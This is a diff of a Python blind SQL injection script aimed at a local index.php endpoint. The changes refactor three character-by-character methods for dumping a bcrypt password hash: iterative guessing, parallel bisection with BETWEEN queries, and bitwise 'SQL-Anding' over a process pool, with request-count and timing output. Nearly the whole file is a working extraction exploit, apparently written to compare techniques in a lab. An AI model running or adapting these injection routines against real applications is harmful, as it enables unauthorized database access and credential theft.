@@ -6,16 +6,24 @@
 import requests
 import sys
 import time
-import threading
+from multiprocessing import Pool
 from urllib.parse import quote_plus
 
-PWD_LENGTH = 60 # Assumed knowledge
-N_THREADS = 5 # For SQL-ANDING
+if len(sys.argv) != 2:
+    print("usage: %s N_THREADS" % sys.argv[0])
+    exit(1)
 
-num_requests = 0
+PWD_LENGTH = 60 # Assumed knowledge
+N_THREADS = int(sys.argv[1]) # Size of thread pool for Bisection / SQL-Anding
+
+# Colors
+C_RESET = "\x1b[0m"
+C_BOLD = "\x1b[1m"
+C_BLUE = "\x1b[38;5;32m"
+C_GREEN = "\x1b[38;5;34m"
+C_YELLOW = "\x1b[38;5;3m"
+
 def oracle(q):
-    global num_requests
-    num_requests += 1
     r = requests.post(
         "http://0.0.0.0/index.php",
         headers={"Content-Type": "application/x-www-form-urlencoded"},
@@ -26,83 +34,89 @@ def oracle(q):
 # Verify the oracle works
 assert oracle("1=1")
 assert not oracle("1=2")
-print("[+] Oracle verified\n")
+print("%s%s[+]%s Oracle verified" % (C_BOLD, C_GREEN, C_RESET))
 
-def regular():
+def iterative():
     password = ""
+    num_requests = 0
+
     for index in range(1, PWD_LENGTH + 1):
-        for char in range(0, 256):
-            if oracle("ASCII(MID(password,%d,1)) = %d" % (index, char)):
+        for char in range(256):
+            num_requests += 1
+            if oracle("ASCII(MID(password, %d, 1)) = %d" % (index, char)):
                 password += chr(char)
-                # sys.stdout.write(chr(char))
-                # sys.stdout.flush()
+                sys.stdout.write(chr(char))
+                sys.stdout.flush()
                 break
-    return password
+
+    return password, num_requests
 
 def bisection():
-    password = ""
-    for index in range(1, PWD_LENGTH + 1):
-        low = 0
-        high = 255
-        mid = 0
-        while low <= high:
-            mid = (low + high) // 2
-            if oracle("ASCII(MID(password,%d,1)) > %d" % (index, mid)):
-                low = mid + 1
-            else:
-                high = mid - 1
-        password += chr(low)
-        # sys.stdout.write(chr(low))
-        # sys.stdout.flush()
-    return password
+    with Pool(N_THREADS) as p:
+        res = p.map(bisection_thread, range(1, PWD_LENGTH + 1))
 
-shm_password = [' '] * PWD_LENGTH
+    password = ''.join(res)
+    sys.stdout.write(password)
+    return password, PWD_LENGTH * 7
+
+# Dumps the char at index 'i'
+# Sends 7 requests
+def bisection_thread(i):
+    low = 0
+    high = 127
+
+    while low <= high:
+        mid = (low + high) // 2
+        if oracle("ASCII(MID(password, %d, 1)) BETWEEN %d AND %d" % (i, low, mid)):
+            high = mid - 1
+        else:
+            low = mid + 1
+
+    return chr(low)
+
 def sqlAnding():
-    global shm_password
-    chunk = int(PWD_LENGTH / N_THREADS)
-    threads = []
-    for i in range(N_THREADS):
-        indices = range(chunk * i + 1, chunk * i + chunk + 1)
-        t = threading.Thread(target=sqlAnding_thread, args=(indices,))
-        t.start()
-        threads.append(t)
-    for t in threads:
-        t.join()
-    return ''.join(shm_password)
+    jobs = []
+    for i in range(1, PWD_LENGTH + 1): # Indices
+        for j in [1, 2, 4, 8, 16, 32, 64]: # Powers of two
+            jobs.append((i,j))
 
-def sqlAnding_thread(indices):
-    global shm_password
-    for index in indices:
-        char = 0
-        for i in range(0, 7):
-            if oracle("ASCII(MID(password,%d,1)) & %d" % (index, 2**i)):
-                char += 2**i
-        shm_password[index-1] = chr(char)
-        # sys.stdout.write('\b' * (PWD_LENGTH+4))
-        # sys.stdout.write('[+] ')
-        # sys.stdout.write(''.join(shm_password))
-        # sys.stdout.flush()
+    with Pool(N_THREADS) as p:
+        res = p.starmap(sqlAnding_thread, jobs)
 
-for i in range(0, 3):
+    password = ""
+    for i in range(0, len(res), 7):
+        password += chr(sum(res[i:i+7]))
+
+    sys.stdout.write(password)
+    return password, len(jobs)
+
+def sqlAnding_thread(index, val):
+    return val if oracle("ASCII(MID(password,%d,1)) & %d" % (index, val)) else 0
+
+# Demonstrate the three algorithms
+for i in range(3):
     num_requests = 0
-    start = time.time()
 
     if i == 0:
-        print("--- REGULAR ---")
-        password = regular()
+        print("\n%s--- ITERATIVE ---\n%s[+]%s " % (C_BOLD, C_GREEN, C_RESET), end='')
+        start = time.time()
+        password, num_requests = iterative()
+
     elif i == 1:
-        print("--- BISECTION ---")
-        password = bisection()
+        print("\n%s--- BISECTION ---\n%s[+]%s " % (C_BOLD, C_GREEN, C_RESET), end='')
+        start = time.time()
+        password, num_requests = bisection()
+
     elif i == 2:
-        print("--- SQL-ANDING (N=%d) ---" % N_THREADS)
-        password = sqlAnding()
+        print("\n%s--- SQL-ANDING ---\n%s[+]%s " % (C_BOLD, C_GREEN, C_RESET), end='')
+        start = time.time()
+        password, num_requests = sqlAnding()
 
     elapsed = time.time() - start
-    print("[+] %s" % password)
 
     # Verify the password was dumped correctly
-    assert password == "$2a$12$rO4AtoGODYaXVOgto5ADa.kfN.kiOYMnW9grfpKl283jrfoIK2Mji"
+    assert password == "$2a$12$HEXnjRPQxxSLVrdUSf7d6.uHn2LZt4vyZ2CN66L/qI177ovoHea66"
 
-    print("\n[*] Total number of requests: %d" % num_requests)
-    print("[*] Avg. requests per char: %.3f" % (num_requests / PWD_LENGTH))
-    print("[*] Time elapsed: %.3f seconds\n" % elapsed)
+    print("\n\n%s%s[*]%s Total number of requests: %s%d%s" % (C_BOLD, C_BLUE, C_RESET, C_YELLOW, num_requests, C_RESET))
+    print("%s%s[*]%s Average requests per char: %s%.3f%s" % (C_BOLD, C_BLUE, C_RESET, C_YELLOW, num_requests / PWD_LENGTH, C_RESET))
+    print("%s%s[*]%s Time elapsed: %s%f%s seconds" % (C_BOLD, C_BLUE, C_RESET, C_YELLOW, elapsed, C_RESET))
